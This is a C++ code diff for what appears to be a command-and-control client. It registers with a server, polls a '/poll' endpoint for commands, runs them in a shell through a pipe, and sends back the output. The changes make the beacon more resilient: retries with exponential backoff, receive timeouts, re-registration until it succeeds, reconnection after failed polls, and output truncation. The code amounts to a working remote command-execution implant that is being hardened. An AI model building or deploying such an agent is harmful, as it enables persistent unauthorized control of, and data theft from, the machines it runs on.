@@ -16,6 +16,7 @@
 
 std::string host = "localhost";
 std::string port = "8000";
+const size_t MAX_OUTPUT = 4096;
 
 #ifdef _WIN32
 using socket_t = SOCKET;
@@ -42,63 +43,94 @@ static bool send_all(socket_t sock, const char* buf, size_t len) {
 }
 
 std::string send_request(const addrinfo* res, const std::string& req) {
-    socket_t sock = socket(res->ai_family, res->ai_socktype, res->ai_protocol);
-    if (sock == INVALID_SOCKET) {
-        std::cerr << "socket creation failed" << std::endl;
-        return "";
-    }
-    if (connect(sock, res->ai_addr, (int)res->ai_addrlen) == SOCKET_ERROR) {
+    int attempts = 0;
+    int backoff = 1;
+    while (attempts < 5) {
+        socket_t sock = socket(res->ai_family, res->ai_socktype, res->ai_protocol);
+        if (sock == INVALID_SOCKET) {
+            std::cerr << "socket creation failed" << std::endl;
+            return "";
+        }
+        // set a receive timeout so recv doesn't block forever
 #ifdef _WIN32
-        std::cerr << "connect failed: " << WSAGetLastError() << std::endl;
-        closesocket(sock);
+        DWORD timeout = 5000;
+        setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (const char*)&timeout, sizeof(timeout));
 #else
-        perror("connect");
-        close(sock);
+        timeval tv{};
+        tv.tv_sec = 5;
+        setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
 #endif
-        return "";
-    }
-    if (!send_all(sock, req.c_str(), req.size())) {
+        if (connect(sock, res->ai_addr, (int)res->ai_addrlen) == SOCKET_ERROR) {
 #ifdef _WIN32
-        std::cerr << "send failed: " << WSAGetLastError() << std::endl;
+            std::cerr << "connect failed: " << WSAGetLastError() << std::endl;
+            closesocket(sock);
 #else
-        perror("send");
+            perror("connect");
+            close(sock);
 #endif
-    }
-    std::string resp;
-    char buf[4096];
-    size_t content_length = 0;
-    bool got_headers = false;
-    size_t body_start = 0;
-    int n;
-    while ((n = recv(sock, buf, sizeof(buf), 0)) > 0) {
-        resp.append(buf, buf + n);
-        if (!got_headers) {
-            size_t pos = resp.find("\r\n\r\n");
-            if (pos != std::string::npos) {
-                got_headers = true;
-                body_start = pos + 4;
-                size_t cl = resp.find("Content-Length:");
-                if (cl != std::string::npos) {
-                    cl += 15;
-                    while (cl < resp.size() && resp[cl] == ' ') cl++;
-                    size_t end = resp.find("\r\n", cl);
-                    if (end != std::string::npos) {
-                        content_length = std::stoul(resp.substr(cl, end - cl));
+        } else if (!send_all(sock, req.c_str(), req.size())) {
+#ifdef _WIN32
+            std::cerr << "send failed: " << WSAGetLastError() << std::endl;
+#else
+            perror("send");
+#endif
+#ifdef _WIN32
+            closesocket(sock);
+#else
+            close(sock);
+#endif
+        } else {
+            std::string resp;
+            char buf[4096];
+            size_t content_length = 0;
+            bool got_headers = false;
+            size_t body_start = 0;
+            int n;
+            bool failed = false;
+            while ((n = recv(sock, buf, sizeof(buf), 0)) > 0) {
+                resp.append(buf, buf + n);
+                if (!got_headers) {
+                    size_t pos = resp.find("\r\n\r\n");
+                    if (pos != std::string::npos) {
+                        got_headers = true;
+                        body_start = pos + 4;
+                        size_t cl = resp.find("Content-Length:");
+                        if (cl != std::string::npos) {
+                            cl += 15;
+                            while (cl < resp.size() && resp[cl] == ' ') cl++;
+                            size_t end = resp.find("\r\n", cl);
+                            if (end != std::string::npos) {
+                                content_length = std::stoul(resp.substr(cl, end - cl));
+                            }
+                        }
                     }
                 }
+                if (got_headers && resp.size() - body_start >= content_length)
+                    break;
+            }
+            if (n <= 0 && (!got_headers || resp.size() - body_start < content_length))
+                failed = true;
+#ifdef _WIN32
+            closesocket(sock);
+#else
+            close(sock);
+#endif
+            if (!failed) {
+                if (got_headers)
+                    return resp.substr(body_start, content_length);
+                return resp;
             }
         }
-        if (got_headers && resp.size() - body_start >= content_length)
-            break;
-    }
 #ifdef _WIN32
-    closesocket(sock);
+        Sleep(backoff * 1000);
 #else
-    close(sock);
+        sleep(backoff);
 #endif
-    if (got_headers)
-        return resp.substr(body_start, content_length);
-    return resp;
+        attempts++;
+        if (backoff < 32)
+            backoff *= 2;
+    }
+    return "";
 }
 
 std::string send_request_host(const std::string& h, const std::string& p, const std::string& req) {
@@ -158,13 +190,30 @@ int main(int argc, char* argv[]) {
     req += "Content-Length: " + std::to_string(body.size()) + "\r\n";
     req += "\r\n";
     req += body;
-    send_request(res, req);
+    int reg_backoff = 1;
+    while (true) {
+        std::string rresp = send_request(res, req);
+        if (rresp == "Registered")
+            break;
+        std::cerr << "Registration failed, retrying in " << reg_backoff << "s" << std::endl;
+#ifdef _WIN32
+        Sleep(reg_backoff * 1000);
+#else
+        sleep(reg_backoff);
+#endif
+        if (reg_backoff < 32)
+            reg_backoff *= 2;
+    }
 
     while (true) {
         std::string pollReq = "GET /poll?client_id=" + client_id + " HTTP/1.1\r\n";
         pollReq += "Host: " + host + "\r\n";
         pollReq += "Connection: close\r\n\r\n";
         std::string resp = send_request(res, pollReq);
+        if (resp.empty()) {
+            std::cerr << "Polling failed, attempting to reconnect..." << std::endl;
+            continue;
+        }
         auto pos = resp.find("\r\n\r\n");
         std::string bodyResp = pos != std::string::npos ? resp.substr(pos + 4) : resp;
         std::string command;
@@ -190,7 +239,17 @@ int main(int argc, char* argv[]) {
             if (pipe) {
                 char buf[1024];
                 while (fgets(buf, sizeof(buf), pipe)) {
-                    result += buf;
+                    if (result.size() < MAX_OUTPUT) {
+                        size_t to_copy = strlen(buf);
+                        if (result.size() + to_copy > MAX_OUTPUT) {
+                            to_copy = MAX_OUTPUT - result.size();
+                        }
+                        result.append(buf, to_copy);
+                        if (result.size() >= MAX_OUTPUT) {
+                            result += "...";
+                            break;
+                        }
+                    }
                 }
 #ifdef _WIN32
                 _pclose(pipe);
